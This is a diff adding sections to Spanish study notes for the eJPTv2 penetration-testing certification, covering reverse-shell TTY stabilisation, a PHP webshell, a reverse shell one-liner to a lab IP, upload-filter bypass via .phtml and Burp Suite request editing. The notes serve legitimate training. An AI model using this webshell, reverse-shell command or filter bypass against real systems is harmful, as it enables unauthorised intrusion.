@@ -486,7 +486,150 @@ Luego, desde la shell que obtuvimos con `msfvenom`, digitamos el siguiente coman
 Sería `bash -c` y entre comillas, pegar el comando generado por la página web revshells.com.   
 Y listo, de esta manera obtenemos una reverse shell estable.  
 
-![46](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/46.jpg)  
+![46](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/46.jpg)   
+
+# Primeros pasos después de la intrusión (Tratamiento de la TTY)  
+Cuando obtengo una reverse shell, debo tratarla porque, de lo contrario, no puedo ejecutar comandos simples, como por ejemplo, `clear`.  
+
+![47](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/47.jpg)    
+
+Aquí están los pasos a seguir.  
+En la shell sin tratar, escribo en el siguiente orden:  
+
+`script /dev/null -c bash
+Dopodichè Ctrl +Z (il processo va in background)
+stty raw -echo; fg
+reset xterm (è molto probabile che non vedrò nulla quando lo digito)
+export TERM=xterm
+export SHELL=bash`  
+
+![48](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/48.jpg)   
+
+¡CONSEJOS!
+Si este tratamiento no funciona, puedo intentar este comando:  
+
+`python -c "import pty;pty.spawn('/bin/bash')"`   
+
+
+# Obtener una intrusión en el servidor mediante una webshell 
+
+Una alternativa para obtener una reverse shell es utilizar una webshell (que es una alternativa a lo que vimos antes con msfvenom y, además, es más estable).  
+Primero, debo crear un archivo .php con nano e insertar este código:  
+
+`<?php
+	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+?>`  
+
+Si ahora abro la web y exploro este archivo, no pasa nada.  
+
+![49](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/49.jpg)     
+
+Es normal que sea así, porque para que funcione, deberé escribir después de ".php?cmd=" el comando que quiero ejecutar.  
+
+`10.10.10.13/uploads/avatar_andrea_web.php?cmd=whoami`  
+
+![50](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/50.jpg)     
+
+Si quiero obtener una reverse shell desde aquí, deberé escribir en la barra de direcciones un comando que deberá ser codificado para la URL, de lo contrario, el navegador no podrá interpretarlo.   
+Para hacerlo, usaré Burp Suite.   
+Seleccionaré el menú Decoder y pegaré el comando:  
+
+`bash -c "sh -i >& /dev/tcp/10.10.10.10/7070 0>&1"`  
+
+obtenido del sitio revshell como se vio en las lecciones anteriores.   
+
+![51](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/51.jpg)  
+
+Luego escucharé en la máquina Kali en el puerto 7070 usado en este ejemplo y en la url después de «?cmd=» copiaré el código generado por Burpsuite.  
+
+![52](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/52.jpg)   
+
+![53](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/53.jpg)    
+
+# Evasión de la restricción de carga de archivos  
+
+Puede ocurrir que al intentar subir un archivo .php recibamos un error, y es lógico porque muchas webs prohíben la subida de archivos .php porque, como hemos visto anteriormente, pueden ser potencialmente dañinos.  
+
+![54](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/54.jpg)     
+
+Podemos utilizar un pequeño truco para saltarnos esta limitación.    
+Si renombramos el archivo y ponemos .phtml como extensión, podremos cargar el archivo, que será interpretado como php.   
+
+![55](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/55.jpg)      
+
+Si todo funciona en este punto, podríamos realizar los pasos como hemos visto antes, es decir, fuzzing para averiguar dónde se guardan los archivos subidos, ejecutar el payload después de escuchar en la máquina atacante, y luego obtener una shell inversa.  
+
+# Burp Suite - Modificación de peticiones HTTP  
+Otro método para subir el archivo saltándose la comprobación de extensión del servidor es utilizando Burpsuite.  
+Veamos cómo proceder.   
+Primero inicio Burpsuite y configuro foxyproxy como Burp en mi navegador.  
+Ahora activo «Intercept on».  
+
+![56](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/56.jpg)  
+
+Así que intento subir mi archivo con la extensión .php.  
+
+![57](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/57.jpg)    
+
+La petición es interceptada por Burpsuite y es aquí donde puedo editarla antes de enviarla al servidor.  
+
+![58](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/58.jpg)     
+
+Cambio la extensión del archivo y pongo .phtml y lo envío al servidor pulsando en 'Reenviar'.   
+
+![59](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/59.jpg)   
+
+El archivo que guardo localmente con extensión .php no ha sido modificado, ¡el concepto es que con Burpsuite puedo modificar peticiones sobre la marcha!  
+
+# Burp Suite - Uso del repetidor  
+El repetidor es muy útil porque nos permite obtener respuestas en tiempo real.  
+Supongamos que no hemos podido subir nuestro archivo .php y queremos probar otras extensiones para ver cuáles funcionan.  
+Lo que puedo hacer es enviar la petición al repetidor, puedo hacerlo pulsando con el botón derecho del ratón y haciendo clic en «enviar al repetidor» o con la combinación Ctrl + R.  
+
+![60](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/60.jpg)    
+
+Así puedo probar varias extensiones para ver cuál funciona realmente.  
+
+![61](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/61.jpg)   
+
+![62](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/62.jpg)      
+
+Una vez que encuentre la extensión que funcione   
+
+![63](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/63.jpg)  
+
+Puedo volver a la pantalla principal, cambiar la extensión por la que he visto que funciona y hacer el forward para editar la petición y enviarla al servidor.  
+
+![64](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/64.jpg)    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
